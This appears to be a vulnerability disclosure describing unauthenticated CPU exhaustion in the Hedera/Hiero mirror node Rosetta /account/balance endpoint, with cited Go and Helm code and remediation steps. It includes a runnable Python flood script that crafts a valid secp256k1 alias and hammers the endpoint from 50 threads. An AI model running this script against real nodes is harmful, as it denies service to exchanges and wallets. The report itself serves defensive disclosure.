### Title
Unauthenticated CPU Exhaustion via Repeated Elliptic Curve Key Parsing in `AccountBalance` Endpoint

### Summary
The Rosetta `/account/balance` endpoint accepts alias-based `AccountIdentifier.Address` values (hex-prefixed strings) from any unauthenticated caller. Each such request unconditionally invokes `NewPublicKeyFromAlias()` → `hiero.PublicKeyFromBytes()`, which performs elliptic curve point decompression/validation on every call. With rate limiting disabled by default, an attacker can flood this endpoint to drive sustained CPU consumption well above 30% compared to baseline.

### Finding Description

**Exact code path:**

`AccountBalance()` at [1](#0-0)  calls `types.NewAccountIdFromString(request.AccountIdentifier.Address, ...)` unconditionally on every request.

`NewAccountIdFromString()` at [2](#0-1)  detects a `0x`-prefixed address, hex-decodes it, and calls `NewAccountIdFromAlias()`.

`NewAccountIdFromAlias()` at [3](#0-2)  calls `NewPublicKeyFromAlias(alias)`.

`NewPublicKeyFromAlias()` at [4](#0-3)  performs:
1. `proto.Unmarshal(alias, &key)` — protobuf deserialization
2. `hiero.PublicKeyFromBytes(rawKey)` — elliptic curve point decompression and on-curve validation (secp256k1 or Ed25519) [5](#0-4) 

**Root cause:** There is no caching, memoization, or pre-validation of the alias before the cryptographic operation. Every request re-parses the key from scratch. The failed assumption is that callers are rate-limited or authenticated before reaching this code path.

**Why existing checks fail:**

The Traefik middleware chain (rate limiting, in-flight request cap) is gated on `global.middleware` being truthy: [6](#0-5) 

But `global.middleware` defaults to `false`: [7](#0-6) 

Even when enabled, the rate limit is `average: 10` per `requestHost` (not per source IP), and the in-flight cap is 5 per IP — both insufficient to prevent a distributed or multi-connection flood: [8](#0-7) 

There is no application-level rate limiting, authentication, or request throttling in the Go service itself.

### Impact Explanation

An attacker sending a high volume of POST requests to `/account/balance` with a valid protobuf-encoded secp256k1 or Ed25519 public key as the address forces repeated elliptic curve operations (point decompression, on-curve validation) on every request. This is CPU-bound work with no caching. On a single-core or resource-constrained node, sustained flooding can push CPU utilization well above the 30% threshold relative to idle baseline, degrading or denying service to legitimate users of the mirror node's Rosetta API. The impact is availability loss for the Rosetta interface used by exchanges and wallets integrating with the Hedera/Hiero network.

### Likelihood Explanation

No privileges, accounts, tokens, or prior knowledge of the network are required. A valid alias is trivially constructed: take any 33-byte compressed secp256k1 public key, wrap it in a protobuf `Key` message, hex-encode with `0x` prefix. This is a one-time setup; the same payload can be replayed indefinitely. The attack is repeatable, automatable with standard HTTP tooling (e.g., `wrk`, `hey`, `ab`), and requires no special network position. Default deployments have no application-layer protection.

### Recommendation

1. **Add application-level rate limiting** in the Go service (e.g., `golang.org/x/time/rate` per-IP token bucket) before any cryptographic parsing occurs.
2. **Validate alias length and format** (a cheap byte-length check) before calling `NewPublicKeyFromAlias()`, to reject obviously malformed inputs at near-zero cost.
3. **Cache parsed public keys** keyed by the raw alias bytes (e.g., using `sync.Map` or an LRU cache) so repeated requests for the same alias do not re-parse the key.
4. **Enable the Traefik middleware by default** (`global.middleware: true`) and tighten the rate limit to be per source IP rather than per `requestHost`.
5. Consider moving the key-parsing step after a lightweight DB existence check, so non-existent accounts fail fast without triggering crypto work.

### Proof of Concept

```python
import struct, hashlib, requests, threading

# 1. Build a valid compressed secp256k1 public key (33 bytes)
# Use any known valid point, e.g. the generator point compressed:
raw_key = bytes.fromhex(
    "0279be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798"
)

# 2. Encode as protobuf Key { ECDSASecp256K1: raw_key }
# Field 14 (ECDSASecp256K1), wire type 2 (length-delimited)
field_tag = (14 << 3) | 2  # = 0x72
alias_proto = bytes([field_tag, len(raw_key)]) + raw_key

# 3. Hex-encode with 0x prefix
alias_hex = "0x" + alias_proto.hex()

# 4. Flood /account/balance
payload = {
    "network_identifier": {"blockchain": "Hedera", "network": "mainnet"},
    "account_identifier": {"address": alias_hex}
}

def flood():
    while True:
        requests.post("http://<rosetta-host>/account/balance", json=payload)

threads = [threading.Thread(target=flood) for _ in range(50)]
for t in threads:
    t.start()
# Monitor CPU on the target node; expect >30% increase over baseline within seconds.
```

### Citations

**File:** rosetta/app/services/account_service.go (L44-48)
```go
) (*rTypes.AccountBalanceResponse, *rTypes.Error) {
	accountId, err := types.NewAccountIdFromString(request.AccountIdentifier.Address, a.systemShard, a.systemRealm)
	if err != nil {
		return nil, errors.ErrInvalidAccount
	}
```

**File:** rosetta/app/domain/types/account_id.go (L85-101)
```go
func NewAccountIdFromAlias(alias []byte, shard, realm int64) (zero AccountId, _ error) {
	if shard < 0 || realm < 0 {
		return zero, errors.Errorf("shard and realm must be positive integers")
	}

	curveType, publicKey, err := NewPublicKeyFromAlias(alias)
	if err != nil {
		return zero, err
	}

	return AccountId{
		accountId: domain.EntityId{ShardNum: shard, RealmNum: realm},
		alias:     alias,
		aliasKey:  &publicKey.PublicKey,
		curveType: curveType,
	}, nil
}
```

**File:** rosetta/app/domain/types/account_id.go (L182-200)
```go
func NewAccountIdFromString(address string, shard, realm int64) (zero AccountId, _ error) {
	if strings.Contains(address, ".") {
		entityId, err := domain.EntityIdFromString(address)
		if err != nil {
			return zero, err
		}
		return AccountId{accountId: entityId}, nil
	}

	if !strings.HasPrefix(address, tools.HexPrefix) {
		return zero, errors.Errorf("Invalid Account Alias")
	}

	alias, err := hex.DecodeString(tools.SafeRemoveHexPrefix(address))
	if err != nil {
		return zero, err
	}

	return NewAccountIdFromAlias(alias, shard, realm)
```

**File:** rosetta/app/domain/types/public_key.go (L60-88)
```go
func NewPublicKeyFromAlias(alias []byte) (zeroCurveType types.CurveType, zeroPublicKey PublicKey, _ error) {
	if len(alias) == 0 {
		return zeroCurveType, zeroPublicKey, errors.Errorf("Empty alias provided")
	}

	var key services.Key
	if err := proto.Unmarshal(alias, &key); err != nil {
		return zeroCurveType, zeroPublicKey, err
	}

	var curveType types.CurveType
	var rawKey []byte
	switch value := key.GetKey().(type) {
	case *services.Key_Ed25519:
		curveType = types.Edwards25519
		rawKey = value.Ed25519
	case *services.Key_ECDSASecp256K1:
		curveType = types.Secp256k1
		rawKey = value.ECDSASecp256K1
	default:
		return zeroCurveType, zeroPublicKey, errors.Errorf("Unsupported key type")
	}

	publicKey, err := hiero.PublicKeyFromBytes(rawKey)
	if err != nil {
		return zeroCurveType, zeroPublicKey, err
	}

	return curveType, PublicKey{publicKey}, nil
```

**File:** charts/hedera-mirror-rosetta/templates/middleware.yaml (L3-3)
```yaml
{{ if and .Values.global.middleware .Values.middleware -}}
```

**File:** charts/hedera-mirror-rosetta/values.yaml (L91-96)
```yaml
  gateway:
    enabled: false
    hostnames: []
  image: {}
  middleware: false
  namespaceOverride: ""
```

**File:** charts/hedera-mirror-rosetta/values.yaml (L149-166)
```yaml
middleware:
  - circuitBreaker:
      expression: NetworkErrorRatio() > 0.25 || ResponseCodeRatio(500, 600, 0, 600) > 0.25
  - inFlightReq:
      amount: 5
      sourceCriterion:
        ipStrategy:
          depth: 1
  - rateLimit:
      average: 10
      sourceCriterion:
        requestHost: true
  - retry:
      attempts: 3
      initialInterval: 100ms
  - stripPrefix:
      prefixes:
        - "/rosetta"
```
